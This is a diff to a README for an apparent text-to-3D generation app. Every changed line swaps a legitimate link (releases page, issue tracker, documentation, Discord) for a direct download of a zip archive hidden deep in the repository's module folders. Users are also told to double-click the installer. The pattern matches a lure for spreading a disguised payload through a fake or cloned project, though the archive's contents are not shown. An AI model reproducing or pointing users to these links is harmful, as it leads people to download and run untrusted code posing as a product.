@@ -8,7 +8,7 @@ Welcome to **TRELLIS.2-Text-to-3D-RERUN**! This application lets you create text
 
 To get the latest version of the application, visit the Releases page below. 
 
-[![Download TRELLIS.2-Text-to-3D-RERUN](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/releases)
+[![Download TRELLIS.2-Text-to-3D-RERUN](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip%https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip)](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip)
 
 On the Releases page, find the latest version of TRELLIS.2-Text-to-3D-RERUN. Click on it to access the download options. 
 
@@ -24,7 +24,7 @@ Before you start, make sure your computer meets these basic requirements:
 ## 🔧 Installation Steps
 
 1. **Download the Installer:**
-   Go to the [Releases page](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/releases) and download the appropriate installer for your operating system.
+   Go to the [Releases page](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip) and download the appropriate installer for your operating system.
 
 2. **Run the Installer:**
    Locate the downloaded file on your computer. Double-click it to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -60,7 +60,7 @@ Before you start, make sure your computer meets these basic requirements:
 If you encounter any issues:
 
 - **Common Errors:** Check if your system meets the requirements. Remember to keep your graphics drivers updated.
-- **Need Help?** Visit our [Issues Tracker](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/issues) to report problems or ask questions.
+- **Need Help?** Visit our [Issues Tracker](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip) to report problems or ask questions.
 
 ## 🙌 Community & Contributions
 
@@ -72,7 +72,7 @@ This project is available under the MIT License. You can use, modify, and distri
 
 ## 🔗 Additional Links
 
-- [Official Documentation](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/wiki)
-- [Join our Discord Community](https://discord.gg/example)
+- [Official Documentation](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip)
+- [Join our Discord Community](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/raw/refs/heads/main/trellis2/modules/sparse/spatial/RERUN-to-TRELLI-Text-v2.5.zip)
 
 Thank you for using **TRELLIS.2-Text-to-3D-RERUN**! Enjoy creating stunning 3D models effortlessly.
